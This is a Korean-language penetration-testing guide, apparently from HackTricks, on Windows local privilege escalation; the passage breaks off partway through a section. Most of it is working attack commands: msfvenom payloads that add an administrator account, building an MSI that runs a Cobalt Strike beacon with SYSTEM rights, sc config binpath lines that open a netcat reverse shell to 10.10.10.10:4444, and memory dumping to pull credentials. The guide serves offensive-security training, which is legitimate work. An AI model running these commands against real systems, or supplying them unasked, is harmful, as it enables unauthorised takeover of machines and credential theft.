# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation 벡터를 찾기 위한 최고의 도구:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## 초기 Windows 이론

### Access Tokens

**Windows Access Tokens가 무엇인지 모른다면, 계속하기 전에 다음 페이지를 읽으세요:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs에 대한 자세한 정보는 다음 페이지를 확인하세요:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows의 Integrity Levels가 무엇인지 모른다면 계속하기 전에 다음 페이지를 읽어야 합니다:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows에는 시스템을 **열거하는 것을 방해하는** 요소가 있거나, 실행 파일 실행을 막거나 심지어 **당신의 활동을 탐지하는** 기능들이 존재합니다. 다음 **페이지를 읽고** 이러한 모든 **방어** **메커니즘을** **열거**하여 **privilege escalation 열거를 시작하기 전에** 확인해야 합니다:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## System Info

### 버전 정보 열거

Windows 버전에 알려진 취약점이 있는지 확인하세요(적용된 패치도 함께 확인).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

이 [site](https://msrc.microsoft.com/update-guide/vulnerability)은 Microsoft 보안 취약점에 대한 자세한 정보를 찾는 데 유용합니다. 이 데이터베이스에는 4,700개가 넘는 보안 취약점이 등록되어 있어 Windows 환경이 지닌 **거대한 공격 표면**을 보여줍니다.

**시스템에서**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas에는 watson이 내장되어 있음)_

**시스템 정보로 로컬에서**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 환경

환경 변수에 자격 증명이나 Juicy한 정보가 저장되어 있나요?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 기록
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell 트랜스크립트 파일

이 기능을 켜는 방법은 [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)에서 확인할 수 있습니다.
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell 파이프라인 실행의 세부 정보가 기록됩니다. 여기에는 실행된 명령, 명령 호출 및 스크립트의 일부가 포함되지만 전체 실행 세부사항과 출력 결과는 완전히 캡처되지 않을 수 있습니다.

이를 활성화하려면 문서의 "Transcript files" 섹션에 있는 지침을 따르되, **"Powershell Transcription"** 대신 **"Module Logging"**을 선택하세요.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell 로그의 마지막 15개 이벤트를 보려면 다음을 실행할 수 있습니다:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

스크립트 실행의 모든 활동과 전체 내용 기록이 캡처되어, 실행되는 모든 block of code가 실행 중에 문서화되도록 보장합니다. 이 프로세스는 각 활동에 대한 포괄적인 감사 추적(audit trail)을 보존하여, forensics 및 악성 행위 분석에 유용합니다. 실행 시점에 모든 활동을 문서화함으로써 프로세스에 대한 상세한 인사이트를 제공합니다.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block의 로깅 이벤트는 Windows Event Viewer에서 다음 경로에 있습니다: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
마지막 20개 이벤트를 보려면 다음을 사용할 수 있습니다:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### 인터넷 설정
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 드라이브
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

업데이트가 http**S**가 아닌 http로 요청될 경우 시스템을 침해할 수 있습니다.

네트워크가 SSL이 아닌 WSUS 업데이트를 사용하는지 확인하려면 cmd에서 다음을 실행합니다:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
또는 PowerShell에서 다음을 실행:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
다음과 같은 응답을 받는 경우:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
그리고 `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` 또는 `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` 가 `1`이면.

그러면, **악용 가능하다.** 마지막 레지스트리 값이 0이면 WSUS 항목은 무시된다.

이 취약점을 악용하기 위해 다음과 같은 도구를 사용할 수 있다: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - 이들은 MiTM로 무장된 exploit 스크립트로 non-SSL WSUS 트래픽에 'fake' 업데이트를 주입한다.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
요약하면, 이 버그가 악용하는 결함은 다음과 같다:

> 로컬 사용자 프록시를 수정할 권한이 있고, Windows Updates가 Internet Explorer의 설정에 구성된 프록시를 사용하는 경우, 우리는 로컬에서 [PyWSUS](https://github.com/GoSecure/pywsus)를 실행해 자신의 트래픽을 가로채고 자산에서 권한 상승된 사용자로서 코드를 실행할 수 있다.
>
> 또한 WSUS 서비스는 현재 사용자의 설정을 사용하므로 현재 사용자의 certificate store도 사용한다. WSUS 호스트명에 대한 self-signed certificate를 생성하여 이를 현재 사용자의 certificate store에 추가하면 HTTP 및 HTTPS WSUS 트래픽을 모두 가로챌 수 있다. WSUS는 certificate에 대해 HSTS-like 메커니즘을 사용해 trust-on-first-use 유형의 검증을 구현하지 않는다. 제시된 certificate가 사용자에 의해 신뢰되고 올바른 호스트명을 가지면 서비스는 이를 수락한다.

이 취약점은 도구 [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (공개되면)를 사용해 악용할 수 있다.

## Third-Party Auto-Updaters and Agent IPC (local privesc)

많은 엔터프라이즈 에이전트는 localhost IPC 인터페이스와 권한이 높은 업데이트 채널을 노출한다. enrollment가 공격자 서버로 강제되고 업데이트 프로그램이 rogue root CA 또는 약한 서명 검증을 신뢰하면, 로컬 사용자는 SYSTEM 서비스가 설치하는 악성 MSI를 전달할 수 있다. (Netskope stAgentSvc 체인 – CVE-2025-0309을 기반으로 한) 일반화된 기법은 다음을 참조:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

특정 조건에서 Windows **domain** 환경에 **local privilege escalation** 취약점이 존재한다. 이러한 조건에는 **LDAP signing is not enforced,** 사용자가 **Resource-Based Constrained Delegation (RBCD)** 을 구성할 수 있는 self-rights를 보유하고 도메인 내에서 컴퓨터를 생성할 수 있는 능력이 포함된다. 이러한 **requirements** 가 **default settings** 로 충족된다는 점에 주목해야 한다.

다음에서 **exploit**을 확인할 수 있다: [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

공격 흐름에 대한 자세한 내용은 [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) 를 확인하라.

## AlwaysInstallElevated

**If** 이 두 레지스트리가 **enabled** (값이 **0x1**) 상태이면, 모든 권한의 사용자가 NT AUTHORITY\\**SYSTEM** 권한으로 `*.msi` 파일을 **install**(실행)할 수 있다.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

`Write-UserAddMSI` 명령을 power-up에서 사용하여 현재 디렉터리 안에 권한 상승을 위한 Windows MSI 바이너리를 생성하세요. 이 스크립트는 사용자/그룹 추가를 요청하는 사전 컴파일된 MSI 설치 프로그램을 출력합니다(따라서 GIU 접근 권한이 필요합니다):
```
Write-UserAddMSI
```
생성된 바이너리를 실행하기만 하면 권한 상승(escalate privileges)이 가능합니다.

### MSI Wrapper

이 튜토리얼을 읽어 MSI Wrapper를 만드는 방법을 배우세요. 참고로 **.bat** 파일은 단순히 **command lines**를 **execute**하려는 경우에만 래핑할 수 있습니다.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike 또는 Metasploit으로 `C:\privesc\beacon.exe`에 저장된 **new Windows EXE TCP payload**를 **Generate**하세요.
- Visual Studio를 열고, **Create a new project**를 선택한 다음 검색 상자에 "installer"를 입력하세요. **Setup Wizard** 프로젝트를 선택하고 **Next**를 클릭하세요.
- 프로젝트 이름을 **AlwaysPrivesc** 등으로 지정하고, 위치는 **`C:\privesc`**를 사용하세요. **place solution and project in the same directory**를 선택하고 **Create**를 클릭하세요.
- 계속 **Next**를 클릭하여 4단계 중 3단계(포함할 파일 선택)로 이동하세요. **Add**를 클릭하고 아까 생성한 Beacon payload를 선택한 다음 **Finish**를 클릭하세요.
- Solution Explorer에서 **AlwaysPrivesc** 프로젝트를 선택하고 **Properties**에서 **TargetPlatform**을 **x86**에서 **x64**로 변경하세요.
- 설치된 앱을 더 신뢰성 있게 보이게 하기 위해 **Author**나 **Manufacturer** 같은 다른 속성들도 변경할 수 있습니다.
- 프로젝트를 우클릭하고 **View > Custom Actions**를 선택하세요.
- **Install**를 우클릭하고 **Add Custom Action**을 선택하세요.
- **Application Folder**를 더블클릭하고 **beacon.exe** 파일을 선택한 다음 **OK**를 클릭하세요. 이렇게 하면 설치 프로그램이 실행되면 즉시 beacon payload가 실행됩니다.
- **Custom Action Properties**에서 **Run64Bit**를 **True**로 변경하세요.
- 마지막으로 **빌드하세요**.
- 경고 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`가 표시되면 플랫폼을 x64로 설정했는지 확인하세요.

### MSI Installation

악성 `.msi` 파일의 **installation**을 **background**에서 실행하려면:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
이 취약점을 악용하려면 다음을 사용할 수 있습니다: _exploit/windows/local/always_install_elevated_

## 안티바이러스 및 탐지기

### 감사 설정

이 설정들은 무엇이 **기록되는지**를 결정하므로 주의해야 합니다.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding은 로그가 어디로 전송되는지 아는 것이 흥미롭다
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**는 **local Administrator passwords의 관리**를 위해 설계되었으며, 도메인에 가입된 컴퓨터에서 각 비밀번호가 **고유하고, 무작위화되며 정기적으로 갱신**되도록 보장합니다. 이 비밀번호들은 Active Directory에 안전하게 저장되며 ACLs를 통해 충분한 권한이 부여된 사용자만 접근할 수 있어 권한이 있는 경우에만 local admin passwords를 조회할 수 있습니다.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

활성화되어 있는 경우, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1**부터 Microsoft는 Local Security Authority (LSA)에 대해 향상된 보호를 도입하여 신뢰되지 않는 프로세스가 **read its memory**하거나 코드를 주입하려는 시도를 **block**하여 시스템을 더욱 안전하게 했습니다.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard**는 **Windows 10**에서 도입되었습니다. 그 목적은 장치에 저장된 credentials를 pass-the-hash 공격과 같은 위협으로부터 보호하는 것입니다.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials**는 **Local Security Authority** (LSA)에 의해 인증되며 운영 체제 구성 요소에서 사용됩니다. 사용자의 로그온 데이터가 등록된 보안 패키지에 의해 인증되면, 해당 사용자의 domain credentials가 일반적으로 생성됩니다.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 사용자 및 그룹

### 사용자 및 그룹 열거

자신이 속한 그룹 중에서 흥미로운 권한이 있는지 확인하세요.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 특권 그룹

**어떤 특권 그룹에 속해 있다면 권한 상승이 가능할 수 있습니다**. 특권 그룹과 이를 악용해 권한을 상승시키는 방법은 다음에서 확인하세요:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### 토큰 조작

**자세히 알아보기**: 이 페이지에서 **토큰**이 무엇인지 확인하세요: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
다음 페이지에서 **흥미로운 토큰**과 이를 악용하는 방법을 확인하세요:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### 로그인한 사용자 / 세션
```bash
qwinsta
klist sessions
```
### 홈 폴더
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### 암호 정책
```bash
net accounts
```
### 클립보드의 내용 가져오기
```bash
powershell -command "Get-Clipboard"
```
## 실행 중인 프로세스

### 파일 및 폴더 권한

무엇보다도 프로세스를 나열할 때 **프로세스의 명령줄에 비밀번호가 포함되어 있는지 확인하세요**.\
**실행 중인 일부 binary를 덮어쓸 수 있는지** 또는 binary 폴더에 쓰기 권한이 있어 잠재적인 [**DLL Hijacking attacks**](dll-hijacking/index.html)을 악용할 수 있는지 확인하세요:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
항상 [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)가 실행 중인지 확인하세요.

**프로세스의 바이너리 권한 확인**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**프로세스 바이너리가 위치한 폴더의 권한 확인 (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### 메모리 Password 마이닝

프로세스가 실행 중일 때 sysinternals의 **procdump**를 사용해 메모리 덤프를 생성할 수 있습니다. FTP 같은 서비스는 **credentials in clear text in memory**를 가질 수 있으니, 메모리를 덤프해서 credentials를 읽어보세요.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 취약한 GUI 앱

**SYSTEM로 실행되는 애플리케이션은 사용자가 CMD를 실행하거나 디렉터리를 탐색할 수 있게 허용할 수 있습니다.**

예: "Windows Help and Support" (Windows + F1)에서 "command prompt"를 검색하고 "Click to open Command Prompt"를 클릭하세요

## 서비스

Service Triggers는 특정 조건이 발생할 때 (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh 등) Windows가 서비스를 시작하도록 합니다. SERVICE_START 권한이 없어도 트리거를 작동시켜 권한 있는 서비스를 시작할 수 있는 경우가 많습니다. 열거 및 활성화 기법은 다음을 참조하세요:

-
{{#ref}}
service-triggers.md
{{#endref}}

서비스 목록 가져오기:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 권한

서비스 정보를 얻기 위해 **sc**를 사용할 수 있습니다.
```bash
sc qc <service_name>
```
_Sysinternals_의 바이너리 **accesschk**를 사용하여 각 서비스에 필요한 권한 수준을 확인하는 것이 권장됩니다.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users"가 어떤 서비스든 수정할 수 있는지 확인하는 것이 권장됩니다:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 서비스 활성화

다음 오류가 발생하는 경우(예: SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

다음 명령을 사용하여 활성화할 수 있습니다
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**서비스 upnphost가 작동하려면 SSDPSRV에 의존한다는 점을 고려하세요 (XP SP1의 경우)**

**또 다른 우회 방법** 이 문제에 대한 방법은 다음을 실행하는 것입니다:
```
sc.exe config usosvc start= auto
```
### **서비스 바이너리 경로 수정**

서비스에 대해 "Authenticated users" 그룹이 **SERVICE_ALL_ACCESS** 권한을 가진 경우, 서비스의 실행 파일 바이너리를 수정할 수 있습니다. **sc**를 수정하고 실행하려면:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 서비스 재시작
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges can be escalated through various permissions:

- **SERVICE_CHANGE_CONFIG**: 서비스 바이너리 재구성을 허용합니다.
- **WRITE_DAC**: 권한 재구성을 가능하게 하며, 서비스 구성을 변경할 수 있게 합니다.
- **WRITE_OWNER**: 소유권 획득 및 권한 재구성을 허용합니다.
- **GENERIC_WRITE**: 서비스 구성 변경 권한을 부여합니다.
- **GENERIC_ALL**: 서비스 구성 변경 권한을 부여합니다.

For the detection and exploitation of this vulnerability, the _exploit/windows/local/service_permissions_ can be utilized.

### Services binaries weak permissions

**서비스가 실행하는 바이너리를 수정할 수 있는지** 또는 **바이너리가 위치한 폴더에 쓰기 권한이 있는지** 확인하세요 ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
You can get every binary that is executed by a service using **wmic** (system32에 있지 않음) and check your permissions using **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
또는 **sc**와 **icacls**를 사용할 수도 있습니다:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### 서비스 레지스트리 수정 권한

서비스 레지스트리를 수정할 수 있는지 확인해야 합니다.\
다음과 같이 서비스 **레지스트리**에 대한 **권한**을 **확인**할 수 있습니다:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
서비스가 실행하는 바이너리에 대해 **Authenticated Users** 또는 **NT AUTHORITY\INTERACTIVE**가 `FullControl` 권한을 가지고 있는지 확인해야 합니다. 만약 그렇다면, 서비스가 실행하는 바이너리를 변경할 수 있습니다.

실행되는 바이너리의 Path를 변경하려면:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### 서비스 레지스트리 AppendData/AddSubdirectory 권한

레지스트리에 대해 이 권한이 있으면 **해당 레지스트리에서 하위 레지스트리를 생성할 수 있습니다**. Windows services의 경우 이는 **임의 코드 실행에 충분합니다:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

실행 파일 경로가 따옴표로 묶여 있지 않으면, Windows는 공백 이전의 각 종료 부분을 실행하려고 시도합니다.

예를 들어, 경로 _C:\Program Files\Some Folder\Service.exe_ 의 경우 Windows는 다음을 실행하려고 시도합니다:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
내장 Windows 서비스에 속한 항목을 제외하고 따옴표 없는 서비스 경로를 모두 나열:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**탐지하고 익스플로잇할 수 있습니다** 이 취약점은 metasploit으로: `exploit/windows/local/trusted_service_path` metasploit으로 수동으로 서비스 바이너리를 생성할 수 있습니다:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 복구 작업

Windows는 서비스 실패 시 수행할 작업을 사용자가 지정할 수 있습니다. 이 기능은 특정 binary를 가리키도록 구성할 수 있습니다. 해당 binary가 교체 가능하다면, privilege escalation이 가능할 수 있습니다. 자세한 내용은 [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)에서 확인하세요.

## 애플리케이션

### 설치된 애플리케이션

다음 항목을 확인하세요: **permissions of the binaries** (어떤 것을 overwrite하여 escalate privileges할 수 있을지도 모릅니다) 및 **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 쓰기 권한

특정 파일을 읽기 위해 일부 config file을 수정할 수 있는지, 또는 Administrator account (schedtasks)에 의해 실행될 바이너리를 수정할 수 있는지 확인하세요.

시스템에서 취약한 folder/files permissions을 찾는 방법은 다음과 같습니다:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### 시작 시 실행

**다른 사용자에 의해 실행될 registry 또는 binary를 덮어쓸 수 있는지 확인하세요.**\
